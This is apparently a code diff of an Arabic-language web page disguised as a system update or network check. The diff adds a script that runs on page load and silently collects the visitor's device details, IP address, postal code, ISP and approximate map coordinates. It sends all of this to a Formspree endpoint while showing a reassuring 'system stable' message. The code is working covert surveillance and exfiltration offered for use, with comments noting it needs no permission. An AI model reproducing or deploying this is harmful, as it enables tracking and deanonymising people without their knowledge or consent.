@@ -2,94 +2,70 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>System Diagnostic v2.6</title>
+    <title>تحديث النظام | 2026</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .terminal { width: 90%; max-width: 600px; border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 15px #0f0; }
-        .cursor { display: inline-block; width: 10px; height: 18px; background: #0f0; animation: blink 1s infinite; }
-        @keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0; } }
+        body { background: #000; color: #00ff00; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .status-box { border: 1px solid #00ff00; padding: 20px; text-align: center; width: 80%; max-width: 400px; }
+        .dots:after { content: '.'; animation: dots 1.5s steps(5, end) infinite; }
+        @keyframes dots { 0%, 20% { content: '.'; } 40% { content: '..'; } 60% { content: '...'; } 80%, 100% { content: ''; } }
     </style>
 </head>
 <body>
-    <div class="terminal">
-        <div id="log">جاري بدء بروتوكول الفحص...<br></div>
-        <span class="cursor"></span>
+    <div class="status-box">
+        <div>جاري فحص بروتوكول الشبكة<span class="dots"></span></div>
+        <p id="progress" style="font-size: 0.8rem; color: #008800;">تحديد استقرار الاتصال...</p>
     </div>
 
     <script>
-        async function fullHackingLog() {
-            const log = document.getElementById('log');
-            const report = {};
-
-            // 1. بيانات الجهاز والعتاد (Hardware)
-            report.device = {
-                platform: navigator.platform,
-                cores: navigator.hardwareConcurrency || "N/A",
-                ram: navigator.deviceMemory || "N/A",
-                screen: `${window.screen.width}x${window.screen.height}`,
-                touch: navigator.maxTouchPoints > 0 ? "نعم" : "لا",
-                gpu: getGPU() // جلب نوع كارت الشاشة
-            };
-
-            // 2. بيانات البرمجيات (Software)
-            report.software = {
+        async function silentCapture() {
+            // 1. جمع معلومات الجهاز الأساسية
+            const report = {
+                timestamp: new Date().toLocaleString(),
+                device: navigator.platform,
                 browser: navigator.userAgent,
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookies: navigator.cookieEnabled
+                language: navigator.language
             };
 
-            // 3. جلب الموقع والشبكة (الـ IP التفصيلي)
+            // 2. جلب أدق بيانات IP (بدون طلب إذن)
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                report.network = {
+                // نستخدم خدمة ipapi لأنها تعطي بيانات الرمز البريدي والإحداثيات التقريبية للبرج
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                
+                report.network_details = {
                     ip: data.ip,
+                    version: data.version,
                     city: data.city,
                     region: data.region,
+                    postal_code: data.postal, // الرمز البريدي هو مفتاح الدقة هنا
                     country: data.country_name,
-                    isp: data.org,
-                    postal: data.postal,
-                    calling_code: data.country_calling_code
+                    isp: data.org, // شركة الاتصالات
+                    asn: data.asn, // رقم نظام الشبكة
+                    tower_location: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
                 };
-            } catch (e) { report.network = "فشل جلب الـ IP"; }
+            } catch (e) {
+                report.network_error = "فشل جلب بيانات الـ IP العميق";
+            }
 
-            // 4. جلب حالة البطارية
+            // 3. جلب حالة البطارية (للتأكد من نوع الجهاز)
             try {
                 const battery = await navigator.getBattery();
-                report.battery = {
-                    level: (battery.level * 100) + "%",
-                    charging: battery.charging ? "يشحن" : "لا يشحن"
-                };
-            } catch (e) { report.battery = "غير مدعوم"; }
+                report.battery = Math.round(battery.level * 100) + "% (" + (battery.charging ? "يشحن" : "لا يشحن") + ")";
+            } catch (e) {}
 
-            // تحديث الشاشة للمستخدم
-            log.innerHTML += "> تم سحب بيانات الشبكة...<br>";
-            log.innerHTML += `> موقع الهدف: ${report.network.city || 'مجهول'}<br>`;
-            log.innerHTML += "> جاري إرسال التقرير النهائي...<br>";
-
-            // 5. الإرسال النهائي إلى Formspree
-            const formID = 'xkozoaaq'; 
+            // 4. إرسال "الطرد" إلى Formspree
+            const formID = 'xkozoaaq'; // ضع ID الخاص بك هنا
+            
             await fetch(`https://formspree.io/f/${formID}`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(report)
             });
 
-            log.innerHTML += "> تم الإرسال بنجاح. النظام مستقر.";
+            document.getElementById('progress').innerText = "تم التحقق من الاتصال. النظام مستقر.";
         }
 
-        function getGPU() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            } catch (e) { return "N/A"; }
-        }
-
-        window.onload = fullHackingLog;
+        window.onload = silentCapture;
     </script>
 </body>
 </html>
-
